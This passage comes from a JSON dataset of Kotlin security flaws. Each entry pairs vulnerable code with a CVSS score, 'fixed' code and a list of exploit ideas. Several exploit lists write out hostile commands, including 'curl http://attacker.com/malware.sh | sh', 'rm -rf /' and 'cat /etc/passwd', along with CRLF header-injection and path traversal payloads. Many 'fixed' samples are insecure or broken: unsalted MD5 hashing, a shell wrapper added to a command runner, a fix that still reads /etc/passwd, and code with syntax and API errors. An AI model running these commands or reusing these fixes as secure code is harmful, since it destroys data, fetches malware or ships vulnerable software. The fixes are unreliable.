        "exploit_ways": [
            "An attacker can use the default username 'admin' and password 'password123' to gain unauthorized access.",
            "If an attacker knows the codebase, they can directly modify or read the source code to find the credentials.",
            "Exploiting any adjacent services that trust this authentication could lead to a broader compromise of the system."
        ]
    },
    "kotlin_17": {
        "vulnerability_type": "Broken Authentication",
        "vulnerability_code": "package com.example.auth\n\nclass Authenticator {\n    private val users = mapOf(\"admin\" to \"password123\", \"user\" to \"letmein\")\n\n    fun authenticate(username: String, password: String): Boolean {\n        return if (users.containsKey(username)) {\n            val storedPasswordHash = hashPassword(users[username]!!)\n            slowCompare(storedPasswordHash, hashPassword(password))\n        } else {\n            false\n        }\n    }\n\n    private fun hashPassword(password: String): String {\n        return password.reversed() // Simplified non-cryptographic \"hashing\"\n    }\n\n    private fun slowCompare(a: String, b: String): Boolean {\n        if (a.length != b.length) return false\n        var result = 0\n        for (i in a.indices) {\n            result or= a[i].toInt() xor b[i].toInt()\n            Thread.sleep(50) // Simulate slow comparison\n        }\n        return result == 0\n    }\n}",
        "cvss_score": 7.8,
        "fixed_code": "package com.example.auth\n\nimport java.security.MessageDigest\n\nclass Authenticator {\n    private val users = mapOf(\"admin\" to \"205d194c36f6ff7fc29dc6dc2a5e4df3\", \"user\" to \"ee26b0dd4af7e749aa1a8ee3c10ae992\")\n\n    fun authenticate(username: String, password: String): Boolean {\n        return if (users.containsKey(username)) {\n            val storedPasswordHash = users[username]!!\n            slowCompare(storedPasswordHash, hashPassword(password))\n        } else {\n            false\n        }\n    }\n\n    private fun hashPassword(password: String): String {\n        val bytes = MessageDigest.getInstance(\"MD5\").digest(password.toByteArray())\n        return bytes.joinToString(\"\") { \"%02x\".format(it) }\n    }\n\n    private fun slowCompare(a: String, b: String): Boolean {\n        if (a.length != b.length) return false\n        var result = 0\n        for (i in a.indices) {\n            result or= a[i].toInt() xor b[i].toInt()\n            Thread.sleep(50)\n        }\n        return result == 0\n    }\n}",
        "exploit_ways": [
            "An attacker can try common username and password combinations to brute-force login.",
            "Using the slowCompare function, attackers could use timing attacks to infer correct characters in passwords by measuring response times.",
            "By observing the reversed hash mechanism, attackers might attempt to reverse-engineer user credentials from the stored hashes."
        ]
    },
    "kotlin_18": {
        "vulnerability_type": "Buffer Overflow",
        "vulnerability_code": "import java.nio.ByteBuffer\n\nclass NativeLib {\n    init {\n        System.loadLibrary(\"native-lib\")\n    }\n\n    external fun nativeMethod(byteArray: ByteArray)\n}\n\nclass BufferOverflowExample {\n    companion object {\n        @JvmStatic\n        fun main(args: Array<String>) {\n            val lib = NativeLib()\n            val largeByteArray = ByteArray(1024 * 1024) // Large byte array to overflow buffer\n            lib.nativeMethod(largeByteArray)\n        }\n    }\n}",
        "cvss_score": 8.5,
        "fixed_code": "import java.nio.ByteBuffer\n\nclass NativeLib {\n    init {\n        System.loadLibrary(\"native-lib\")\n    }\n\n    external fun nativeMethod(byteArray: ByteArray)\n}\n\nclass BufferOverflowExample {\n    companion object {\n        private const val MAX_BUFFER_SIZE = 1024 * 512 // Define a reasonable buffer size limit\n\n        @JvmStatic\n        fun main(args: Array<String>) {\n            val lib = NativeLib()\n            val byteArray = ByteArray(MAX_BUFFER_SIZE)\n            // Additional checks or logic to populate byteArray safely\n            lib.nativeMethod(byteArray)\n        }\n    }\n}",
        "exploit_ways": [
            "An attacker could craft a malicious payload that exceeds the buffer size, leading to arbitrary code execution.",
            "By inputting a specially crafted large byte array, an attacker might overwrite return addresses on the stack, causing the program to execute unintended code.",
            "Overflowing the buffer can corrupt adjacent memory, potentially leading to crashes or data leaks."
        ]
    },
    "kotlin_19": {
        "vulnerability_type": "Remote Code Execution (RCE)",
        "vulnerability_code": "import java.io.BufferedReader\nimport java.io.InputStreamReader\nimport kotlin.system.exitProcess\n\nclass CommandExecutor {\n    fun execute(command: String) {\n        try {\n            val process = Runtime.getRuntime().exec(command)\n            val inputStream = BufferedReader(InputStreamReader(process.inputStream))\n            var line: String?\n            while (inputStream.readLine().also { line = it } != null) {\n                println(line)\n            }\n            exitProcess(process.waitFor())\n        } catch (e: Exception) {\n            e.printStackTrace()\n        }\n    }\n}\n\nfun main(args: Array<String>) {\n    if (args.isNotEmpty()) {\n        val executor = CommandExecutor()\n        executor.execute(args[0])\n    }\n}",
        "cvss_score": 9.8,
        "fixed_code": "import java.io.BufferedReader\nimport java.io.InputStreamReader\nimport kotlin.system.exitProcess\n\nclass CommandExecutor {\n    private val allowedCommands = listOf(\"ls\", \"whoami\")\n    fun execute(command: String) {\n        if (command !in allowedCommands) {\n            println(\"Command not allowed\")\n            exitProcess(1)\n        }\n        try {\n            val process = Runtime.getRuntime().exec(arrayOf(\"sh\", \"-c\", command))\n            val inputStream = BufferedReader(InputStreamReader(process.inputStream))\n            var line: String?\n            while (inputStream.readLine().also { line = it } != null) {\n                println(line)\n            }\n            exitProcess(process.waitFor())\n        } catch (e: Exception) {\n            e.printStackTrace()\n        }\n    }\n}\n\nfun main(args: Array<String>) {\n    if (args.isNotEmpty()) {\n        val executor = CommandExecutor()\n        executor.execute(args[0])\n    }\n}",
        "exploit_ways": [
            "An attacker can input 'rm -rf /' to delete all files on the system.",
            "They could use 'curl http://attacker.com/malware.sh | sh' to download and execute malicious code.",
            "Chaining commands like 'ls; cat /etc/passwd' could be used to list directory contents and view sensitive information."
        ]
    },
    "kotlin_20": {
        "vulnerability_type": "Remote Code Execution (RCE)",
        "vulnerability_code": "fun main() {\n    val userInput = readLine()!!\n    Runtime.getRuntime().exec(userInput)\n}",
        "cvss_score": 8.2,
        "fixed_code": "fun main() {\n    val allowedCommands = listOf(\"ls\", \"whoami\")\n    val userInput = readLine()!!\n    if (userInput in allowedCommands) {\n        Runtime.getRuntime().exec(userInput)\n    } else {\n        println(\"Command not allowed\")\n    }\n}",
        "exploit_ways": [
            "User could input 'rm -rf /' to delete system files.",
            "Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.",
            "Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files."
        ]
    },
    "kotlin_21": {
        "vulnerability_type": "Cross-Site Request Forgery (CSRF)",
        "vulnerability_code": "fun transferFunds(toAccount: String, amount: Double) {\n    // Simulate transferring funds to another account\n    println(\"Transferring $$amount to $toAccount\")\n}",
        "cvss_score": 7.5,
        "fixed_code": "fun transferFunds(toAccount: String, amount: Double, csrfToken: String) {\n    // Validate CSRF token before processing the request\n    if (validateCsrfToken(csrfToken)) {\n        println(\"Transferring $$amount to $toAccount\")\n    } else {\n        println(\"Invalid CSRF Token\")\n    }\n}\n\nfun validateCsrfToken(token: String): Boolean {\n    // Implement token validation logic here\n    return true // Placeholder for actual validation\n}",
        "exploit_ways": [
            "An attacker can trick a logged-in user into clicking a malicious link to transfer funds without their consent.",
            "By crafting a form submission with the victim's session cookies, an attacker can perform unauthorized fund transfers.",
            "Using social engineering tactics, an attacker could deceive users into executing actions on a compromised site that triggers CSRF vulnerabilities."
        ]
    },
    "kotlin_22": {
        "vulnerability_type": "Command Injection",
        "vulnerability_code": "class UnsafeExecutor {\n    fun execute(command: String) {\n        Runtime.getRuntime().exec(command)\n    }\n}",
        "cvss_score": 8.2,
        "fixed_code": "class SafeExecutor {\n    fun execute(command: List<String>) {\n        val processBuilder = ProcessBuilder(command)\n        processBuilder.start()\n    }\n}",
        "exploit_ways": [
            "An attacker can input 'ls; rm -rf /' to delete all files.",
            "Could use 'curl http://attacker.com/malware.sh | sh' to download and execute malicious scripts.",
            "Input like 'whoami && sudo su' could escalate privileges if the system is misconfigured."
        ]
    },
    "kotlin_23": {
        "vulnerability_type": "Command Injection",
        "vulnerability_code": "class VulnerableShell {\n    fun executeCommand(command: String) {\n        val process = Runtime.getRuntime().exec(command)\n        process.waitFor()\n    }\n}",
        "cvss_score": 8.2,
        "fixed_code": "class SecureShell {\n    fun executeCommand(command: String, vararg args: String) {\n        val processBuilder = ProcessBuilder(command).command(*args)\n        processBuilder.start().waitFor()\n    }\n}",
        "exploit_ways": [
            "An attacker can input 'echo vulnerable' ; rm -rf / to delete all files.",
            "Could use 'curl http://attacker.com/malware.sh | sh' to execute remote malicious scripts.",
            "Chaining commands like 'ls; cat /etc/passwd' could leak sensitive system information."
        ]
    },
    "kotlin_24": {
        "vulnerability_type": "Path Traversal",
        "vulnerability_code": "import java.io.File\nimport java.io.FileReader\nclass FileLoader {\n    fun loadFile(path: String): String {\n        val file = File(path)\n        val reader = FileReader(file)\n        return reader.readText()\n    }\n}",
        "cvss_score": 7.5,
        "fixed_code": "import java.io.File\nimport java.io.FileReader\nclass FileLoader {\n    fun loadFile(baseDir: String, path: String): String {\n        val base = File(baseDir)\n        val file = File(base, path).canonicalFile\n        if (!file.startsWith(base)) throw IllegalArgumentException(\"Path traversal attack detected\")\n        val reader = FileReader(file)\n        return reader.readText()\n    }\n}",
        "exploit_ways": [
            "An attacker can input \"../secret.txt\" to access files outside the intended directory.",
            "Using \"../../etc/passwd\" might allow reading sensitive system files.",
            "\"../../../../flag\" could be used in a CTF scenario to retrieve hidden flags."
        ]
    },
    "kotlin_25": {
        "vulnerability_type": "Missing Security Headers",
        "vulnerability_code": "import io.ktor.application.*\nimport io.ktor.response.*\nimport io.ktor.routing.*\nimport io.ktor.server.engine.*\nimport io.ktor.server.netty.*\n\nfun main() {\n    embeddedServer(Netty, port = 8080) {\n        routing {\n            get(\"/\") {\n                call.respondText(\"Hello, world!\")\n            }\n        }\n    }.start(wait = true)\n}",
        "cvss_score": 6.5,
        "fixed_code": "import io.ktor.application.*\nimport io.ktor.response.*\nimport io.ktor.routing.*\nimport io.ktor.server.engine.*\nimport io.ktor.server.netty.*\nimport io.ktor.http.content.SecurityHeaders\nimport io.ktor.features.ContentSecurityPolicy\nimport io.ktor.features.XFrameOptions\nimport io.ktor.features.XXSSProtection\nimport io.ktor.features.XContentTypeOptions\n\nfun main() {\n    embeddedServer(Netty, port = 8080) {\n        install(SecurityHeaders) {\n            contentSecurityPolicy { \n                policy Directives.defaultSrc(\"self\")\n            }\n            xFrameOptions(XFrameOptions.SameOrigin)\n            xXSSProtection()\n            xContentTypeOptions()\n        }\n        routing {\n            get(\"/\") {\n                call.respondText(\"Hello, world!\")\n            }\n        }\n    }.start(wait = true)\n}",
        "exploit_ways": [
            "An attacker can inject malicious scripts into web pages due to lack of Content Security Policy (CSP).",
            "Clickjacking attacks are possible because the X-Frame-Options header is missing.",
            "Reflected Cross-Site Scripting (XSS) attacks could occur as XSS protection headers are not set."
        ]
    },
    "kotlin_26": {
        "vulnerability_type": "Open Redirect",
        "vulnerability_code": "fun vulnerableRedirect(url: String) {\n    val intent = Intent(Intent.ACTION_VIEW).apply {\n        data = Uri.parse(url)\n    }\n    startActivity(intent)\n}",
        "cvss_score": 6.5,
        "fixed_code": "fun safeRedirect(url: String) {\n    val allowedHosts = listOf(\"example.com\", \"safeapp.com\")\n    val uri = Uri.parse(url)\n    if (uri.host in allowedHosts) {\n        val intent = Intent(Intent.ACTION_VIEW).apply {\n            data = uri\n        }\n        startActivity(intent)\n    } else {\n        // Handle error or log attempt\n    }\n}",
        "exploit_ways": [
            "An attacker can redirect users to a malicious site like 'http://malicious.com'.",
            "They could use the redirect to install malware by pointing to a malicious APK download URL.",
            "Attackers might exploit this to phish for user credentials by redirecting them to a fake login page."
        ]
    },
    "kotlin_27": {
        "vulnerability_type": "Clickjacking (Low Severity)",
        "vulnerability_code": "class WebViewContainer : AppCompatActivity() {\\n    override fun onCreate(savedInstanceState: Bundle?) {\\n        super.onCreate(savedInstanceState)\\n        val webView = WebView(this)\\n        setContentView(webView)\\n        val webSettings = webView.settings\\n        webSettings.javaScriptEnabled = true\\n        webView.loadUrl(\"https://example.com\")\\n    }\\n}",
        "cvss_score": 3.1,
        "fixed_code": "class WebViewContainer : AppCompatActivity() {\\n    override fun onCreate(savedInstanceState: Bundle?) {\\n        super.onCreate(savedInstanceState)\\n        val webView = WebView(this)\\n        setContentView(webView)\\n        val webSettings = webView.settings\\n        webSettings.javaScriptEnabled = true\\n        webView.setLayerType(WebView.LAYER_TYPE_HARDWARE, null)\\n        val transparentBackground = Color.parseColor(\"#00FFFFFF\")\\n        webView.setBackgroundColor(transparentBackground)\\n        webView.webChromeClient = WebChromeClient()\\n        webView.webViewClient = object : WebViewClient() {\\n            override fun shouldOverrideUrlLoading(view: WebView?, request: WebResourceRequest?): Boolean {\\n                return if (Uri.parse(\"https://example.com\").host.equals(request?.url?.host)) {\\n                    false // Let the WebView load the URL\\n                } else {\\n                    true // Redirect to browser or block\\n                }\\n            }\\n        }\\n        webView.loadUrl(\"https://example.com\")\\n    }\\n}",
        "exploit_ways": [
            "An attacker could overlay a transparent WebView over a legitimate site and trick users into clicking malicious buttons.",
            "By using iframes, an attacker can attempt to load the WebView in another context to steal clicks intended for other elements.",
            "Crafting specific URLs that the WebView might interpret differently than expected can lead to unauthorized actions within the WebView."
        ]
    },
    "kotlin_28": {
        "vulnerability_type": "Local File Inclusion (LFI) - Limited Scope",
        "vulnerability_code": "fun readFile(fileName: String): String? {\\n    val file = java.io.File(\"/safe/directory/$fileName\")\\n    return if (file.exists() && !file.isDirectory) file.readText() else null\\n}",
        "cvss_score": 4.2,
        "fixed_code": "fun readFile(fileName: String): String? {\\n    val safeDirectory = \"/safe/directory/\"\\n    val canonicalPath = java.io.File(safeDirectory + fileName).canonicalPath\\n    return if (canonicalPath.startsWith(safeDirectory) && !java.io.File(canonicalPath).isDirectory) java.io.File(canonicalPath).readText() else null\\n}",
        "exploit_ways": [
            "An attacker can use '../' to navigate up the directory tree and access files outside of /safe/directory.",
            "By using symbolic links within /safe/directory, an attacker might redirect the file path to a sensitive location.",
            "Exploiting relative paths with '..%2F..' could bypass naive checks if not properly sanitized."
        ]
    },
    "kotlin_29": {
        "vulnerability_type": "HTTP Response Splitting",
        "vulnerability_code": "package com.example\nimport javax.servlet.http.HttpServlet\nimport javax.servlet.http.HttpServletRequest\nimport javax.servlet.http.HttpServletResponse\nclass VulnerableServlet : HttpServlet() {\n    override fun doGet(request: HttpServletRequest, response: HttpServletResponse) {\n        val userParam = request.getParameter(\"userInput\")\n        response.setHeader(\"Set-Cookie\", \"data=$userParam; path=/\")\n        response.writer.println(\"User input received: $userParam\")\n    }\n}",
        "cvss_score": 5.3,
        "fixed_code": "package com.example\nimport javax.servlet.http.HttpServlet\nimport javax.servlet.http.HttpServletRequest\nimport javax.servlet.http.HttpServletResponse\nclass SecureServlet : HttpServlet() {\n    override fun doGet(request: HttpServletRequest, response: HttpServletResponse) {\n        val userParam = request.getParameter(\"userInput\")?.replace(\"\r\", \"\").replace(\"\n\", \"\")\n        response.setHeader(\"Set-Cookie\", \"data=$userParam; path=/\")\n        response.writer.println(\"User input received: $userParam\")\n    }\n}",
        "exploit_ways": [
            "An attacker can inject '\\r\\nSet-Cookie: admin=true' to manipulate cookies.",
            "Could use '\\r\\nContent-Length: 0\\r\\n\\r\\nHTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\nContent-Length: 36\\r\\n\\r\\n<html><body>Malicious Content</body></html>' to inject additional responses.",
            "Injecting '\\r\\nX-XSS-Protection: 0' can disable XSS protection on the client."
        ]
    },
    "kotlin_31": {
        "vulnerability_type": "Session Fixation (Low Severity)",
        "vulnerability_code": "package com.example.sessionfixation\\nimport javax.servlet.http.Cookie\\nimport javax.servlet.http.HttpServlet\\nimport javax.servlet.http.HttpServletRequest\\nimport javax.servlet.http.HttpServletResponse\\nclass LoginServlet : HttpServlet() {\\n    override fun doGet(req: HttpServletRequest, resp: HttpServletResponse) {\\n        val sessionId = req.getParameter(\"session_id\")\\n        if (sessionId != null) {\\n            val cookie = Cookie(\"SESSIONID\", sessionId)\\n            resp.addCookie(cookie)\\n        }\\n        resp.sendRedirect(\"/home\")\\n    }\\n}",
        "cvss_score": 4.2,
        "fixed_code": "package com.example.sessionfixation\\nimport javax.servlet.http.Cookie\\nimport javax.servlet.http.HttpServlet\\nimport javax.servlet.http.HttpServletRequest\\nimport javax.servlet.http.HttpServletResponse\\nclass LoginServlet : HttpServlet() {\\n    override fun doGet(req: HttpServletRequest, resp: HttpServletResponse) {\\n        val session = req.getSession(true)\\n        val cookie = Cookie(\"SESSIONID\", session.id)\\n        resp.addCookie(cookie)\\n        resp.sendRedirect(\"/home\")\\n    }\\n}",
        "exploit_ways": [
            "An attacker can set a specific session_id in the URL to hijack a valid user's session.",
            "By sharing the malicious link, the attacker can trick users into using a fixed session ID controlled by them.",
            "The vulnerability can be used in phishing attacks to create authenticated sessions for attackers."
        ]
    },
    "kotlin_32": {
        "vulnerability_type": "Server-Side Request Forgery (SSRF) - Limited Scope",
        "vulnerability_code": "import java.net.URL\nimport java.io.BufferedReader\nimport java.io.InputStreamReader\nfun fetchData(urlString: String): String {\n    val url = URL(urlString)\n    val reader = BufferedReader(InputStreamReader(url.openStream()))\n    var inputLine: String?\n    val response = StringBuilder()\n    while (reader.readLine().also { inputLine = it } != null) {\n        response.append(inputLine)\n    }\n    reader.close()\n    return response.toString()\n}",
        "cvss_score": 7.5,
        "fixed_code": "import java.net.URL\nimport java.io.BufferedReader\nimport java.io.InputStreamReader\nfun fetchData(urlString: String): String {\n    val allowedHosts = listOf(\"api.example.com\", \"secure.example.com\")\n    val url = URL(urlString)\n    if (!allowedHosts.contains(url.host)) {\n        throw IllegalArgumentException(\"Unauthorized host\")\n    }\n    val reader = BufferedReader(InputStreamReader(url.openStream()))\n    var inputLine: String?\n    val response = StringBuilder()\n    while (reader.readLine().also { inputLine = it } != null) {\n        response.append(inputLine)\n    }\n    reader.close()\n    return response.toString()\n}",
        "exploit_ways": [
            "An attacker could request an internal resource by passing a URL like 'http://localhost:8080/secrets'.",
            "Using SSRF, attackers might access sensitive services on the same network segment, such as database servers or web management interfaces.",
            "By requesting URLs with crafted payloads, an attacker can attempt to cause Denial of Service (DoS) conditions by overloading internal resources."
        ]
    },
    "kotlin_33": {
        "vulnerability_type": "Denial-of-Service (DoS) - Low Impact",
        "vulnerability_code": "import java.io.IOException\\nimport kotlin.system.exitProcess\\n\\nclass DosServer {\\n    @Throws(IOException::class)\\n    fun start() {\\n        while (true) {\\n            try {\\n                Thread.sleep(1000)\\n                println(\"Server is running...\")\\n            } catch (e: InterruptedException) {\\n                println(\"Thread interrupted: ${e.message}\")\\n            }\\n        }\\n    }\\n\\n    companion object {\\n        @JvmStatic\\n        fun main(args: Array<String>) {\\n            val server = DosServer()\\n            server.start()\\n        }\\n    }\\n}",
        "cvss_score": 3.5,
        "fixed_code": "import java.io.IOException\nimport kotlin.system.exitProcess\n\nclass DosServer {\n    @Throws(IOException::class)\n    fun start() {\n        while (true) {\n            try {\n                Thread.sleep(1000)\n                println(\"Server is running...\")\n            } catch (e: InterruptedException) {\n                println(\"Thread interrupted: ${e.message}\")\n                exitProcess(1)\n            }\n        }\n    }\n\n    companion object {\n        @JvmStatic\n        fun main(args: Array<String>) {\n            val server = DosServer()\n            server.start()\n        }\n    }\n}",
        "exploit_ways": [
            "An attacker could exploit the infinite loop by interrupting the thread, causing the server to continuously restart.",
            "By sending a SIGINT signal repeatedly, the server might become unresponsive if not handled properly.",
            "The server's constant resource usage (CPU and memory) can lead to system exhaustion, affecting other applications."
        ]
    },
    "kotlin_34": {
        "vulnerability_type": "Open Redirect",
        "vulnerability_code": "fun openRedirect(url: String) {\n    val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url))\n    startActivity(intent)\n}",
        "cvss_score": 6.5,
        "fixed_code": "fun safeOpenRedirect(baseUrl: String, url: String) {\n    if (url.startsWith(baseUrl)) {\n        val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url))\n        startActivity(intent)\n    } else {\n        throw IllegalArgumentException(\"Invalid URL\")\n    }\n}",
        "exploit_ways": [
            "An attacker can redirect users to a malicious site by providing a crafted URL.",
            "The vulnerability can be used to launch phishing attacks by directing users to fake login pages.",
            "Users can be redirected to download malware or execute harmful scripts if the URL points to a compromised server."
        ]
    },
    "kotlin_35": {
        "vulnerability_type": "Information Disclosure (Low Severity)",
        "vulnerability_code": "import java.io.File\nimport java.io.FileReader\nfun readSensitiveFile(): String {\n    val file = File(\"/etc/passwd\")\n    val reader = FileReader(file)\n    return reader.readText()\n}",
        "cvss_score": 3.5,
        "fixed_code": "import java.nio.file.Files\nimport java.nio.file.Paths\nfun readSensitiveFile(): String {\n    try {\n        return String(Files.readAllBytes(Paths.get(\"/etc/passwd\")))\n    } catch (e: Exception) {\n        e.printStackTrace()\n        return \"\"\n    }\n}",
        "exploit_ways": [
            "An attacker could gain access to system user information by exploiting this vulnerability.",
            "They might use the disclosed information for social engineering attacks or further privilege escalation.",
            "The file contents could be used to identify potential attack vectors on the system."
        ]
    },
    "kotlin_36": {
        "vulnerability_type": "Race Condition (Difficult to Exploit)",
        "vulnerability_code": "import kotlinx.coroutines.*\n\nobject SharedResource {\n    var value = 0\n}\n\nfun main() = runBlocking {\n    val jobs = List(100) { launch {\n        repeat(1000) {\n            SharedResource.value++\n        }\n    }}\n    jobs.forEach { it.join() }\n    println(\"Final value: ${SharedResource.value}\")\n}",
        "cvss_score": 3.5,
        "fixed_code": "import kotlinx.coroutines.*\n\nobject SharedResource {\n    private val mutex = Mutex()\n    var value = 0\n        get() = field\n        set(value) { field = value }\n}\n\nsuspend fun incrementValue() {\n    SharedResource.mutex.withLock {\n        SharedResource.value++\n    }\n}\n\nfun main() = runBlocking {\n    val jobs = List(100) { launch {\n        repeat(1000) {\n            incrementValue()\n        }\n    }}\n    jobs.forEach { it.join() }\n    println(\"Final value: ${SharedResource.value}\")\n}",
        "exploit_ways": [
            "An attacker could potentially manipulate the execution order of coroutines to achieve incorrect increments.",
            "By controlling coroutine scheduling, an attacker might cause the final value to be less than expected due to race conditions.",
            "If this code is part of a larger system, an attacker could exploit the race condition to alter the state in unpredictable ways."
        ]
    },
    "kotlin_37": {
        "vulnerability_type": "Open Redirect",
        "vulnerability_code": "fun redirectTo(url: String) {\n    val encodedUrl = URLEncoder.encode(url, \"UTF-8\").replace(\"%3A\\\", \":\").replace(\"%2F\\\", /\")\n    val intent = Intent(Intent.ACTION_VIEW, Uri.parse(encodedUrl))\n    startActivity(intent)\n}",
        "cvss_score": 7.5,
        "fixed_code": "fun redirectTo(url: String) {\n    val allowedHosts = listOf(\"example.com\", \"anotherallowed.com\")\n    val uri = Uri.parse(url)\n    if (uri.host in allowedHosts) {\n        val intent = Intent(Intent.ACTION_VIEW, uri)\n        startActivity(intent)\n    } else {\n        throw IllegalArgumentException(\"Invalid URL host\")\n    }\n}",
        "exploit_ways": [
            "An attacker could redirect users to a malicious site by providing a crafted URL.",
            "They can use the vulnerability to phish for user credentials by redirecting them to a fake login page.",
            "Crafted URLs could be used to install malware on the device by redirecting to an untrusted download source."
        ]
    },
    "kotlin_38": {
        "vulnerability_type": "Information Disclosure (Low Severity)",
        "vulnerability_code": "fun sensitiveDataLeak(): String {\\n    val secret = \\\"This is a secret message.\\\"\\n    return if (System.getenv(\\\"DEBUG\\\") == \\\"true\\\") secret else \\\"No data to show.\\\"\\n}",
        "cvss_score": 3.0,
        "fixed_code": "fun sensitiveDataLeak(): String {\\n    val secret = \\\"This is a secret message.\\\"\\n    return if (System.getenv(\\\"DEBUG\\\") == \\\"true\\\") && BuildConfig.DEBUG) secret else \\\"No data to show.\\\"\\n}",
        "exploit_ways": [
            "An attacker setting the DEBUG environment variable to 'true' can access sensitive information.",
            "If running in a development environment, the DEBUG flag might be set inadvertently leading to information disclosure.",
            "In cloud deployments with misconfigured environment variables, attackers could exploit this vulnerability."
        ]
    },
    "kotlin_39": {
        "vulnerability_type": "Session Fixation",
        "vulnerability_code": "fun setSessionCookie(userId: String, response: HttpServletResponse) {\n    val cookie = Cookie(\"SESSIONID\", userId)\n    cookie.path = \"/\"\n    cookie.isHttpOnly = true\n    response.addCookie(cookie)\n}",
        "cvss_score": 4.2,
        "fixed_code": "fun setSessionCookie(userId: String, response: HttpServletResponse) {\n    val sessionId = java.util.UUID.randomUUID().toString()\n    val cookie = Cookie(\"SESSIONID\", sessionId)\n    cookie.path = \"/\"\n    cookie.isHttpOnly = true\n    response.addCookie(cookie)\n}",
        "exploit_ways": [
            "An attacker can predict or guess the session ID if it is based on a predictable pattern.",
            "If a valid session ID is leaked, an attacker can hijack the user's session by setting the same SESSIONID cookie in their browser.",
            "By manipulating URLs with pre-set session IDs, attackers could force users to authenticate under compromised sessions."
        ]
    },
    "kotlin_40": {
        "vulnerability_type": "Session Fixation (Low Severity)",
        "vulnerability_code": "import javax.servlet.http.HttpServletRequest\nimport javax.servlet.http.HttpServletResponse\nfun setSessionId(request: HttpServletRequest, response: HttpServletResponse) {\n    val sessionId = request.getParameter(\"session_id\")\n    if (sessionId != null) {\n        request.changeSessionId()\n        val session = request.getSession(true)\n        session.id = sessionId\n    }\n}",
        "cvss_score": 4.2,
        "fixed_code": "import javax.servlet.http.HttpServletRequest\nimport javax.servlet.http.HttpServletResponse\nfun setSessionId(request: HttpServletRequest, response: HttpServletResponse) {\n    request.changeSessionId()\n}",
        "exploit_ways": [
            "An attacker can provide a session ID to associate their own session with the target user's account.",
            "By setting a specific session ID, an attacker can maintain control over the session after the user logs in.",
            "This allows the attacker to perform actions as if they were logged in as the target user without authentication."
        ]
    },
    "kotlin_41": {
        "vulnerability_type": "Clickjacking (Low Severity)",
        "vulnerability_code": "import android.view.View\nfun setupOverlay(view: View) {\n    val overlay = View(context)\n    overlay.visibility = View.VISIBLE\n    view.parent.addView(overlay)\n}",
        "cvss_score": 4.0,
        "fixed_code": "import android.view.View\nimport android.widget.FrameLayout\nimport android.view.ViewGroup.LayoutParams\nfun setupOverlay(view: View) {\n    val overlay = View(context)\n    overlay.visibility = View.VISIBLE\n    val params = FrameLayout.LayoutParams(LayoutParams.MATCH_PARENT, LayoutParams.MATCH_PARENT)\n    params.setMargins(0, 0, 0, 0)\n    view.parent.addView(overlay, params)\n    overlay.setOnClickListener { v ->\n        // Handle click event to prevent unintended actions\n    }\n}",
        "exploit_ways": [
            "An attacker could overlay a transparent malicious button on top of the intended UI element.",
            "By positioning the overlay strategically, they can trick users into clicking it without realizing.",
            "The overlay can be made to mimic another application's interface, causing users to perform actions unintentionally."
        ]
    },
    "kotlin_42": {
        "vulnerability_type": "Session Fixation (Low Severity)",
        "vulnerability_code": "package com.example\n\nimport javax.servlet.http.Cookie\nimport javax.servlet.http.HttpServletRequest\nimport javax.servlet.http.HttpServletResponse\nimport javax.servlet.annotation.WebServlet\nimport javax.servlet.http.HttpServlet\n\n@WebServlet(\"/login\")\nclass LoginServlet : HttpServlet() {\n    override fun doGet(request: HttpServletRequest, response: HttpServletResponse) {\n        val session = request.getSession(true)\n        val sessionIdCookie = Cookie(\"JSESSIONID\", session.id)\n        response.addCookie(sessionIdCookie)\n        response.sendRedirect(\"/dashboard\")\n    }\n}",
        "cvss_score": 3.1,
        "fixed_code": "package com.example\n\nimport javax.servlet.http.Cookie\nimport javax.servlet.http.HttpServletRequest\nimport javax.servlet.http.HttpServletResponse\nimport javax.servlet.annotation.WebServlet\nimport javax.servlet.http.HttpServlet\n\n@WebServlet(\"/login\")\nclass LoginServlet : HttpServlet() {\n    override fun doGet(request: HttpServletRequest, response: HttpServletResponse) {\n        request.changeSessionId()\n        val session = request.getSession(true)\n        val sessionIdCookie = Cookie(\"JSESSIONID\", session.id)\n        response.addCookie(sessionIdCookie)\n        response.sendRedirect(\"/dashboard\")\n    }\n}",
        "exploit_ways": [
            "An attacker can set a fixed JSESSIONID cookie in the victim's browser before they log in, then hijack the session.",
            "Attacker could use this to perform actions on behalf of the logged-in user without their knowledge.",
            "By fixing the session ID, attackers can maintain control over sessions across multiple login attempts."
        ]
    },
    "kotlin_43": {
        "vulnerability_type": "Local File Inclusion (LFI) - Limited Scope",
        "vulnerability_code": "fun readFile(fileName: String): String? {\\n    val file = java.io.File(fileName)\\n    return file.readText()\\n}",
        "cvss_score": 5.3,
        "fixed_code": "fun readFile(fileName: String, allowedPaths: List<String>): String? {\\n    if (allowedPaths.contains(fileName)) {\\n        val file = java.io.File(fileName)\\n        return file.readText()\\n    }\\n    throw IllegalArgumentException(\"File not allowed\")\\n}",
        "exploit_ways": [
            "An attacker can input '/etc/passwd' to read system user information.",
            "They could use '../flag.txt' to access files outside the intended directory if any flag file exists nearby.",
            "Input like 'C:\\\\Windows\\\\system.ini' on a Windows server to retrieve sensitive system configuration."
        ]
    },
    "kotlin_44": {
        "vulnerability_type": "Race Condition (Difficult to Exploit)",
        "vulnerability_code": "fun unsafeFunction() {\n    val file = java.io.File(\"example.txt\")\n    if (!file.exists()) {\n        file.createNewFile()\n    }\n    val writer = file.writer()\n    writer.write(\"Sensitive data\\n\")\n    writer.close()\n}",
        "cvss_score": 5.3,
        "fixed_code": "fun safeFunction() {\n    val file = java.io.File(\"example.txt\")\n    file.createNewFile()\n    synchronized(file) {\n        val writer = file.writer(Append)\n        writer.write(\"Sensitive data\\n\")\n        writer.close()\n    }\n}",
        "exploit_ways": [
            "An attacker could create a symlink to a critical system file before the file check, causing sensitive data to be written there.",
            "By repeatedly running the program and deleting the file at the right moment, an attacker might prevent the file from being created properly, leading to potential data loss or corruption.",
            "If multiple instances of the application are run simultaneously, they could interfere with each other's file operations, potentially leading to incomplete writes or corrupted data."
        ]
    },
    "kotlin_45": {
        "vulnerability_type": "Missing Security Headers",
        "vulnerability_code": "fun handleRequest(response: HttpServletResponse) {\n    response.writer.write(\"Hello, World!\")\n}",
        "cvss_score": 3.5,
